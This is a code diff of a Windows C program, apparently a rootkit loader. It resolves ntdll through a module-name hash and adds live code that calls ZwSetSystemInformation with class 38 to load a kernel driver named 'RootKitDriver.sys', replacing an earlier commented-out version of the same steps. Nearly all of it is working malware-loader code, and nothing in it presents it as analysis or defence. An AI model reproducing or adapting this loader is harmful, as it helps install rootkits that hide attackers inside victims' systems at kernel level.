@@ -66,11 +66,11 @@ PVOID SelfGetProcAddress(HMODULE module, uint8_t name[16]) {
 */
 
 int main() {
-
+ 
     uint8_t ntdllHash[16] = { 0xa3,0xcb,0x33,0x79,0xad,0x0c,0xf1,0x93,0xfa,0xe7,0x5c,0xa4,0x71,0x86,0xc0,0x02 };
 
     HMODULE ntdllBase = (HMODULE)SelfGetModuleHandle(ntdllHash);
-
+    /*
     uint8_t kernelhash[16] = { 0x31,0x0f,0x76,0x5e,0xda,0xab,0x10,0x80,0xde,0x41,0xdc,0x38,0xdd,0x3a,0x06,0x02 };
     HMODULE kerneldllBase = (HMODULE)SelfGetModuleHandle(kernelhash);
     if (kerneldllBase == NULL) {
@@ -108,11 +108,33 @@ int main() {
         printf("%x", FilePtr[i]);
     }
     printf("\nFinish !\n");
-    //SYSTEM_LOAD_AND_CALL_IMAGE Image;
-    //WCHAR mypath[] = L"./driver.sys";
-    //RTLINITUNICODESTRING RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
-    //ZWSETSYSTEMINFORMATION ZwSetSystemInformation = (ZWSETSYSTEMINFORMATION)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "ZwSetSystemInformation");
-    //RtlInitUnicodeString(&Image.ModuleName, mypath);
-    //ZwSetSystemInformation(38, &Image,sizeof(SYSTEM_LOAD_AND_CALL_IMAGE));
-    return 1;
+    */
+    SYSTEM_LOAD_AND_CALL_IMAGE GregsImage;
+    ZWSETSYSTEMINFORMATION ZwSetSystemInformation;
+    RTLINITUNICODESTRING RtlInitUnicodeString;
+    int result;
+    WCHAR daPath[] = L"RootKitDriver.sys";
+
+    ////////////////////////////////////////////////////////////// 
+    // get DLL entry points 
+    ////////////////////////////////////////////////////////////// 
+    if (!(RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress(ntdllBase, "RtlInitUnicodeString")))
+    {
+        printf("RtlInitUnicodeString error !!! %p", RtlInitUnicodeString);
+        return false;
+    }
+
+    if (!(ZwSetSystemInformation = (ZWSETSYSTEMINFORMATION)GetProcAddress(ntdllBase, "ZwSetSystemInformation"))){
+        printf("ZwSetSystemInformation error !!! %p", ZwSetSystemInformation);
+        return false;
+    }
+
+    RtlInitUnicodeString(&(GregsImage.ModuleName), daPath);
+    if (!NT_SUCCESS(result = ZwSetSystemInformation(38, &GregsImage, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE))))
+    {
+        printf("Loading error !!! %d", result);
+        return false;
+    }
+
+    return true;
 }
